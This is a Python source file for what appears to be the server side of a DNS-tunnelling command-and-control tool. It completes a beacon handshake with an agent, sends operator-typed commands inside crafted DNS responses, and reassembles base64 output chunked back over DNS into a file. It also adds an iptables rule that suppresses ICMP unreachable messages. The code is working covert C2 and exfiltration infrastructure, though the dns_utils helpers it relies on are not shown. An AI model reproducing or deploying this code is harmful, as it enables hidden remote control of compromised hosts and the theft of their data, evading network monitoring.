from dns_utils import *
from typing import IO
from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP
from scapy.layers.dns import *
from scapy.layers.inet import *
import os, logging, sys

CHFILE = 0
EXIT = 1
SHOW = 2

class C2_DNS_SERVER:    
    def __init__(self, domain, logger: logging, iface: str, dns_server: str,max_payload_size: int =95, ack: int     =10 , file: str ='/dev/tty'):
        os.system("iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")
        self.ready = handshack[READY]
        self.domain = domain
        self.logger = logger
        self.file = file
        self.DNS_Comm = DNS_Comm(domain, iface, logger, max_payload_size, ack, ip=dns_server)
        self.logger.debug("[d] Waiting for becon")
        self.Commands = ['./chfile', './exit', './show']
        while not self.__Handshake(handshack[BEACON], handshack[ACTIVATE]):
            pass
        self.logger.debug("[d] Connection Established!")

    def __Handshake(self, beacon_massege, activate_message) -> bool:
        result = self.DNS_Comm.Recive()
        if result is not None:
            payload, pkt = result
            self.logger.debug(f"[d] payload: {base64.b64decode(payload[DATA])}, size: {payload[DATA_SIZE]}, id: {payload[DATA_ID]}, Is End: {payload[DATA_END]}")
            self.DNS_Comm.Add_IP(pkt)
            if beacon_massege in base64.b64decode(payload[DATA]):
                self.logger.info("[!] Recived a Becon!")
                res_pkt = self.DNS_Comm.Craft_Response(activate_message, pkt, payload[DATA_ID])
                Send(res_pkt, hold=True)
                return True

        return False
    
    def Commad_Handler(self, req_pkt: Packet, data_id):
        ok = False
        end = False
        total_trans = ''
        data_id = 0
        while not ok:
            cmd = input("[cmd] ")
            ok = self.parser(cmd)           

        res_pkt = self.DNS_Comm.Craft_Response(cmd.encode(), req_pkt, data_id)
        Send(res_pkt)
        self.logger.debug("[d] Packet sent")
        with open(self.file, 'bw') as fd:
            while not end:
                result = self.DNS_Comm.Recive(timeout=5, filter=f"udp and ip src {self.DNS_Comm.ip}")
                if result is not None:
                    payload, req_pkt = result
                    self.logger.debug(f"[d] data id is: {payload[DATA_ID]} waiting for: {data_id}")
                    if data_id == payload[DATA_ID]:
                        end = payload[DATA_END]
                        total_trans += payload[DATA].decode()
                        res_pkt = self.DNS_Comm.Craft_Response(b"ACK", req_pkt, payload[DATA_ID])
                        data_id += 1
                    else:
                        res_pkt = self.DNS_Comm.Craft_Response(b"RE", req_pkt, data_id - 1)
                    Send(res_pkt)
            total_trans = base64.b64decode(total_trans)

            fd.write(total_trans)
        
    def change_file(self, cmd: str):
        self.file = cmd.split(' ')[1]
        self.logger.info(f"[!] File to write changed to: {self.file}")

    def parser(self, cmd: str):
        first = cmd.split(' ')[0]
        for index, command in enumerate(self.Commands):
            if first == command:
                if index == EXIT:
                    self.__del__()
                elif index == CHFILE:
                    self.change_file(cmd)
                    return False
        return True
        

    def run(self):
        while True:
            payload, pkt = self.DNS_Comm.Recive()
            if not payload: continue
            self.logger.debug(f"[d] payload: {base64.b64decode(payload[DATA])}, size: {payload[DATA_SIZE]}, id: {payload[DATA_ID]}, Is End: {payload[DATA_END]}")
            if self.ready not in base64.b64decode(payload[DATA]): continue
            break
            
        while True:
            self.logger.info("[!] Agent is waiting for your command:")
            self.Commad_Handler(pkt, payload[DATA_ID])

    
    def __del__(self):
        os.system("iptables -D OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")
        sys.exit()                  
        
if '__main__' == __name__:
    domain = "c2.dns"   
    iface = 'eth0'
    dns_server = '192.168.3.3'
    logger = Create_Logger_Object(logging.DEBUG)

    c2_server = C2_DNS_SERVER(domain, logger, iface, dns_server)
    c2_server.run()